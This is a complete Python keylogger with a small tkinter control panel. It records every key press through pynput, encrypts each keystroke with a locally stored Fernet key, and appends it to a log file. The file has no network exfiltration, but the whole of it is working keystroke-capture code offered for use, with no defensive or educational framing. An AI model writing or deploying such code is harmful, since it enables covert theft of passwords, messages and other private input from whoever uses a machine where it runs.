import os
import threading
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# ==========================
# Encryption Setup
# ==========================

# Generate a key (do this only once and save the key for later use)
key_path = "encryption.key"
if not os.path.exists(key_path):
    with open(key_path, "wb") as key_file:
        key = Fernet.generate_key()
        key_file.write(key)
else:
    with open(key_path, "rb") as key_file:
        key = key_file.read()

cipher = Fernet(key)

# File to save encrypted logs
log_file = "encrypted_key_log.txt"

# Flag to control the listener thread
keylogger_running = False
listener_thread = None

# ==========================
# Keylogger Functions
# ==========================

def encrypt_and_save_log(data):
    """Encrypts and saves logged data to a file."""
    encrypted_data = cipher.encrypt(data.encode())
    with open(log_file, "ab") as file:  # Append encrypted data
        file.write(encrypted_data + b"\n")

def on_press(key):
    """Handle key press events."""
    try:
        # Record alphanumeric keys
        key_data = key.char
    except AttributeError:
        # Handle special keys like Enter, Space, etc.
        key_data = f"[{key}]"

    encrypt_and_save_log(key_data)

def on_release(key):
    """Handle key release events."""
    global keylogger_running
    if key == Key.esc or not keylogger_running:
        # Stop listener if ESC is pressed or keylogger_running is False
        return False

def run_keylogger():
    """Runs the keylogger listener."""
    global keylogger_running
    keylogger_running = True
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ==========================
# GUI for Control
# ==========================

def start_keylogger():
    """Starts the keylogger in a new thread."""
    global listener_thread, keylogger_running
    if not keylogger_running:
        keylogger_running = True
        listener_thread = threading.Thread(target=run_keylogger, daemon=True)
        listener_thread.start()
        messagebox.showinfo("Keylogger", "Keylogger started! Press 'ESC' to stop.")

def stop_keylogger():
    """Stops the keylogger."""
    global keylogger_running
    keylogger_running = False
    messagebox.showinfo("Keylogger", "Keylogger stopped!")

# ==========================
# GUI Setup
# ==========================

# Create the main GUI window
root = tk.Tk()
root.title("Keylogger Control Panel")
root.geometry("300x200")

# Instructions Label
tk.Label(root, text="Keylogger Control", font=("Arial", 16)).pack(pady=10)

# Start Button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, bg="green", fg="white", font=("Arial", 12))
start_button.pack(pady=10)

# Stop Button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", font=("Arial", 12))
stop_button.pack(pady=10)

# Run the GUI event loop
root.mainloop()
